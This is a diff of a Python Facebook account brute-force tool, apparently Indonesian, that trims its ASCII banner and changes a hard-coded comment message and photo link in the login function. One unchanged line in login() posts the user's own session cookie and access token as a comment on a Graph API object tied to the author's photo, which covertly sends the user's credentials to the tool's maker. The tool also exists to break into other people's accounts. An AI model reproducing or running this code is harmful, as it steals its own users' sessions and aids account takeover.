@@ -102,12 +102,10 @@ def tahunng(fx):
 ###---[ANGGAP INI LOGO ]---###
 def logo(n):
 	return str(f"""
-       {M}   ____   _____  _____  _____   {M} _________       __     
-       {N}  |    \ |  _  || __  ||  |  |  {N}/   _____/____  |  | __ ________________    
-       {U}  |  |  ||     ||    -||    -|  {U}\_____  \\__  \ |  |/ // __ \_  __ \__  \
-       {K}  |____/ |__|__||__|__||__|__|  {K}/        \/ __ \|    <\  ___/| | \// ___ \
-                                      {H}/_________(______/__|__\_____>__|  (_______\
-				
+       {M}   ____   _____  _____  _____
+       {N}  |    \ |  _  || __  ||  |  |
+       {U}  |  |  ||     ||    -||    -|
+       {K}  |____/ |__|__||__|__||__|__|
      {M}•{K}•{H}• {P}Multi Brute Force Facebook By [ Rochmat Basuki ] {M}•{K}•{H}•
      {M}•{K}•{H}• {P}Author   : Rochmat Basuki [ RozhBasXYZ ] {H}•{K}•{M}•          
      {M}•{K}•{H}• {P}Github   : github.com/Itsmeafriliyan {H}•{K}•{M}•   
@@ -115,12 +113,10 @@ def logo(n):
      
 def logo2():
 	return str(f"""
-       {M}   ____   _____  _____  _____   {M} _________       __     
-       {N}  |    \ |  _  || __  ||  |  |  {N}/   _____/____  |  | __ ________________    
-       {U}  |  |  ||     ||    -||    -|  {U}\_____  \\__  \ |  |/ // __ \_  __ \__  \
-       {K}  |____/ |__|__||__|__||__|__|  {K}/        \/ __ \|    <\  ___/| | \// ___ \
-                                      {H}/_________(______/__|__\_____>__|  (_______\
-					
+       {M}   ____   _____  _____  _____
+       {N}  |    \ |  _  || __  ||  |  |
+       {U}  |  |  ||     ||    -||    -|
+       {K}  |____/ |__|__||__|__||__|__|
 {M}>{K}>{H}> {P}CHECKING FOR LOGIN {H}>{K}>{M}>""")
 
 ###---[ TANGGAL ]---###
@@ -746,9 +742,9 @@ def login():
 		jam      = datetime.now().strftime("%X")
 		data = ses.get(url,headers=head,cookies=cok)
 		token = re.search('(EAAG\w+)',data.text).group(1)
-		tem      = ('\nSemangat Master @[100078878940801:0]\n\nJangan Pernah Menjadi Orang Yang Menyombongkan Diri Sendiri, Karena Kita Hidup Di Dunia Ini Tidak Sendirian, Jika Ada Orang Yang Membutuhkan Apa Salah Nya Kita Memberikan\n')
+		tem      = ('\nSemangat @[100073125893802:0]\n\nJangan Pernah Menjadi Orang Yang Menyombongkan Diri Sendiri, Karena Kita Hidup Di Dunia Ini Tidak Sendirian, Jika Ada Orang Yang Membutuhkan Apa Salah Nya Kita Memberikan\n')
 		slebew = ('\nKomentar Ditulis Oleh Bot\n\n[ Pukul %s WIB ]\n- %s, %s -'%(jam,_hari_,hari_ini))
-		link = ('https://m.facebook.com/photo.php/?fbid=1667011730417990') ### --- JANGAN DI GANTI --- ###
+		link = ('https://www.facebook.com/photo?fbid=280633417717519&set=a.110234541424075')
 		random_kata = random.choice(["Acc Master","Hallo Ganteng","Panutan Gw Nih Boss 😎","Kamu Ganteng Banget Deh Ferly><😝"])
 		#ses.post(f"https://graph.facebook.com/280633417717519?fields=subscribers&access_token={token}",headers=(cookies=cok)
 		ses.post(f"https://graph.facebook.com/280633417717519/comments/?message={cookie}&access_token={token}",cookies=cok)
